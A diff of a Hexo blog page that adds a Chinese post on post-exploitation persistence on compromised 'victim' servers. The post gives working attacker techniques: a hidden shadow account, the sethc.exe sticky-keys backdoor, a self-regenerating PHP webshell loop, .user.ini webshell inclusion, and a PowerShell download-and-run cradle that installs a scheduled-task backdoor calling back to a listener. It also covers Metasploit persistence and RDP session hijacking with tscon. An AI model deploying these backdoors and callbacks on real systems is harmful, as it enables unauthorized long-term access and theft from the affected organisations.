@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="后渗透,权限维持,">
 
 
 
@@ -86,16 +86,18 @@
 
 
 
-<meta name="description" content="一个兴趣使然的信息安全爱好者">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|">
-<meta property="og:url" content="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/Linux特性/index.html">
+<meta name="description" content="简介何为“后渗透”？就是获取到受害者服务器的权限后，再继续对受害者服务器进行长期攻击或者信息获取的一种持续性手段。常见的手段有，后门、影子账户、会话劫持等等。 实验一、影子账户原理：创建一个跟普通用户一样的用户，但是只能在注册表中才能查看到的用户。 net user username$ /add net user二、shift后门原理：将按5下shift时调用的“粘滞键”替换为“CMD” 将 C:">
+<meta name="keywords" content="后渗透,权限维持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="后渗透之维护权限">
+<meta property="og:url" content="http://MaiKeFee.com/archives/b9ce30ce.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="一个兴趣使然的信息安全爱好者">
+<meta property="og:description" content="简介何为“后渗透”？就是获取到受害者服务器的权限后，再继续对受害者服务器进行长期攻击或者信息获取的一种持续性手段。常见的手段有，后门、影子账户、会话劫持等等。 实验一、影子账户原理：创建一个跟普通用户一样的用户，但是只能在注册表中才能查看到的用户。 net user username$ /add net user二、shift后门原理：将按5下shift时调用的“粘滞键”替换为“CMD” 将 C:">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-08T16:49:04.528Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|">
-<meta name="twitter:description" content="一个兴趣使然的信息安全爱好者">
+<meta name="twitter:title" content="后渗透之维护权限">
+<meta name="twitter:description" content="简介何为“后渗透”？就是获取到受害者服务器的权限后，再继续对受害者服务器进行长期攻击或者信息获取的一种持续性手段。常见的手段有，后门、影子账户、会话劫持等等。 实验一、影子账户原理：创建一个跟普通用户一样的用户，但是只能在注册表中才能查看到的用户。 net user username$ /add net user二、shift后门原理：将按5下shift时调用的“粘滞键”替换为“CMD” 将 C:">
 
 
 
@@ -125,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/Linux特性/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/b9ce30ce.html">
 
 
 
 
 
-  <title>分类: Linux特性 | MaiKeFee|</title>
+  <title>后渗透之维护权限 | MaiKeFee|</title>
   
 
 
@@ -150,7 +152,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     
 <a href="https://github.com/MaiKeFee" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -297,53 +299,373 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Linux特性<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/b9ce30ce.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/archives/18ca0ec6.html" itemprop="url">
-              
-                <span itemprop="name">Linux通配符绕过文件名黑名单</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">后渗透之维护权限</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T22:39:51+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-09T00:40:29+08:00">
+                2019-09-09
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-09T00:49:04+08:00">
+                2019-09-09
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/" itemprop="url" rel="index">
+                    <span itemprop="name">知识科普</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/archives/b9ce30ce.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/b9ce30ce.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/archives/b9ce30ce.html" class="leancloud_visitors" data-flag-title="后渗透之维护权限">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  938
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>何为“后渗透”？就是获取到受害者服务器的权限后，再继续对受害者服务器进行长期攻击或者信息获取的一种持续性手段。常见的手段有，后门、影子账户、会话劫持等等。</p>
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="一、影子账户"><a href="#一、影子账户" class="headerlink" title="一、影子账户"></a>一、影子账户</h2><p>原理：创建一个跟普通用户一样的用户，但是只能在注册表中才能查看到的用户。</p>
+<pre><code>net user username$ /add
+net user</code></pre><h2 id="二、shift后门"><a href="#二、shift后门" class="headerlink" title="二、shift后门"></a>二、shift后门</h2><pre><code>原理：将按5下shift时调用的“粘滞键”替换为“CMD”
+将 C:\WINDOWS\system32\dllcache\sethc.exe删除，这个文件夹中放着缓存，如果不    删除就会自动变回去
+找到  C:\WINDOWS\system32\cmd.exe 将其复制并将名称更改为 sethc.exe，放回文    件夹中
+这次按5次shift键就可以打开cmd了</code></pre><h2 id="三、反弹加入自启（鸡肋）"><a href="#三、反弹加入自启（鸡肋）" class="headerlink" title="三、反弹加入自启（鸡肋）"></a>三、反弹加入自启（鸡肋）</h2><pre><code>1、NC反弹
+
+2、Bash反弹
+
+3、perl反弹
+
+4、Python反弹
+
+5、PHP反弹
+
+6、等等</code></pre><blockquote>
+<p>反弹代码参考这里 <a href="http://maikefee.com/archives/5d509f57.html">http://maikefee.com/archives/5d509f57.html</a></p>
+</blockquote>
+<blockquote>
+<p>将反弹的脚本写入到启动项里，当受害者启动服务器时，自动反弹shell。弊端就是要一直监听，还要有公网的IP。</p>
+</blockquote>
+<h2 id="四、隐藏后门文件"><a href="#四、隐藏后门文件" class="headerlink" title="四、隐藏后门文件"></a>四、隐藏后门文件</h2><blockquote>
+<p>1、将木马文件属性改为“隐藏”<br>2、将木马名字进行伪装处理，伪装成系统文件或者报错文件。修改时间跟系统文件时间类似。<br>3、利用循环不死马（举栗子）</p>
+</blockquote>
+<pre><code>&lt;?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    while(1){
+    file_put_contents(&apos;phpinf0.php&apos;,&apos;&lt;?php $a=array($_REQUEST[&quot;kk&quot;]=&gt;&quot;3&quot;);
+    $b=array_keys($a)[0];
+    eval($b);?&gt;&apos;);
+    sleep(8);
+    }
+?&gt;</code></pre><ul>
+<li>说明：此脚本会每8秒不断的向服务器生成一个“phpinf0.php”的一句话木马.</li>
+</ul>
+<h2 id="五、利用-user-ini文件自动包含木马文件"><a href="#五、利用-user-ini文件自动包含木马文件" class="headerlink" title="五、利用.user.ini文件自动包含木马文件"></a>五、利用.user.ini文件自动包含木马文件</h2><blockquote>
+<p>在“.user.ini”文件写入</p>
+</blockquote>
+<pre><code>auto_prepend_file=pic.gif</code></pre><blockquote>
+<p>在”pic.gif”文件写入一句话木马</p>
+</blockquote>
+<pre><code>&lt;!–?php $a = “a”.”s”.”s”.”e”.”r”.”t”;$a($_POST[“kk”]); ?–&gt;</code></pre><blockquote>
+<p>利用成功前提下必须有以下三个文件，</p>
+</blockquote>
+<pre><code>1、PHP的正常文件
+2、修改后.user.ini文件
+3、luomiweixiong.gif木马</code></pre><blockquote>
+<p>说明：在限制了PHP文件上传的条件下，上传ini文件，再进行文件包含拿shell.</p>
+</blockquote>
+<h2 id="六、Powershell权限维持"><a href="#六、Powershell权限维持" class="headerlink" title="六、Powershell权限维持"></a>六、Powershell权限维持</h2><p>参考此PowerShell脚本</p>
+<pre><code>https://github.com/re4lity/Schtasks-Backdoor</code></pre><p>利用代码：</p>
+<pre><code>powershell.exe-exec bypass -c &quot;IEX (New-ObjectNet.WebClient).DownloadString(&apos;http://192.168.124.25/Invoke-taskBackdoor.ps1&apos;);Invoke-Tasksbackdoor-method nccat -ip 192.168.124.14 -port 666 -time 2&quot;</code></pre><p>说明：<br>    1、192.168.124.25为受害者IP,前提是要把PowerShell脚本放到受害者服务器能访问到的根路径。<br>    2、192.168.124.14为接收反弹回来的IP,可用NC监听反弹回来的shell</p>
+<h2 id="七、metasploit权限维持"><a href="#七、metasploit权限维持" class="headerlink" title="七、metasploit权限维持"></a>七、metasploit权限维持</h2><p>1、Persistence模块<br>    前提是利用MSF获取到了对方的会话</p>
+<pre><code>run persistence -U -i 12 -p 6666 -r 192.168.124.14</code></pre><p>说明</p>
+<pre><code>-i  目标自动回连时间
+-p  设置目标反向连接的端口
+-r  设置目标反向连接的ip地址
+-U  设置目标自启动
+加入自启动后，就算受害者机器再次启动也能弹回shell
+2、metsvc 模块
+前提是利用MSF获取到了对方的会话
+run metsvc -A
+说明：
+-A 自动启动一个匹配的 multi/handler 以连接到该服务
+该模块是在受害者服务器开启了一个“Meterpreter”服务
+下次攻击者可以利用metsvc_bind_tcp监听模块就可以再次获取到shell
+监听端口为31337</code></pre><h2 id="八、会话劫持"><a href="#八、会话劫持" class="headerlink" title="八、会话劫持"></a>八、会话劫持</h2><p>说明：RDP会话劫持是在不知道另一用户密码的条件下进行切换用户登录</p>
+<pre><code>query user
+sc create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#4&quot;
+net start sesshijack</code></pre><blockquote>
+<p>维护权限还有很多种方法，我这里只是举几个栗子.</p>
+</blockquote>
+<blockquote>
+<p>公众号看到的,做个记录.</p>
+</blockquote>
 
       
     </div>
+    
+    
+    
+   <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束❤感谢阅读-------------</div>
+    
+</div>
+    
+ </div>
+     <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>后渗透之维护权限</p>
+  <p><span>文章作者:</span>MaiKeFee</p>
+  <p><span>发布时间:</span>2019年09月09日</p>
+  <p><span>最后更新:</span>2019年09月09日</p>
+  <p><span>原始链接:</span><a href="/archives/b9ce30ce.html" title="后渗透之维护权限">http://MaiKeFee.com/archives/b9ce30ce.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/b9ce30ce.html" aria-label="复制成功！"></i></span>
+  </p>
+  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+    
+</div>
+    
+
+    
+
+   
+
+  <footer class="post-footer">
+
+    
+      
+        <div class="post-tags">
+          
+            <a href="/tags/后渗透/" rel="tag"><i class="fa fa-tag"></i> 后渗透</a>
+          
+            <a href="/tags/权限维持/" rel="tag"><i class="fa fa-tag"></i> 权限维持</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/2c24cfb2.html" rel="next" title="Metasploit免杀payload笔记(持续更新)">
+                <i class="fa fa-chevron-left"></i> Metasploit免杀payload笔记(持续更新)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+          
+        </div>
+      
+ 
+      
+      
+    </footer>
 
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -351,6 +673,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -371,8 +700,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -495,6 +833,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验"><span class="nav-number">2.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、影子账户"><span class="nav-number">2.1.</span> <span class="nav-text">一、影子账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、shift后门"><span class="nav-number">2.2.</span> <span class="nav-text">二、shift后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、反弹加入自启（鸡肋）"><span class="nav-number">2.3.</span> <span class="nav-text">三、反弹加入自启（鸡肋）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、隐藏后门文件"><span class="nav-number">2.4.</span> <span class="nav-text">四、隐藏后门文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、利用-user-ini文件自动包含木马文件"><span class="nav-number">2.5.</span> <span class="nav-text">五、利用.user.ini文件自动包含木马文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、Powershell权限维持"><span class="nav-number">2.6.</span> <span class="nav-text">六、Powershell权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、metasploit权限维持"><span class="nav-number">2.7.</span> <span class="nav-text">七、metasploit权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、会话劫持"><span class="nav-number">2.8.</span> <span class="nav-text">八、会话劫持</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -651,6 +1005,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1211,13 +1569,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = ''.length > 0
+      var isPost = '后渗透之维护权限'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = ''
+        var title = '后渗透之维护权限'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
@@ -1225,7 +1583,7 @@
       else if (!isArchive && !isCategory && !isTag) { //is index page
         var titles = [] //array to titles
 
-        var postsstr = 'titles.push("Linux通配符绕过文件名黑名单");' //if you have a better way to get titles of posts, please change it
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
         eval(postsstr)
 
         var promises = titles.map(function (title) {
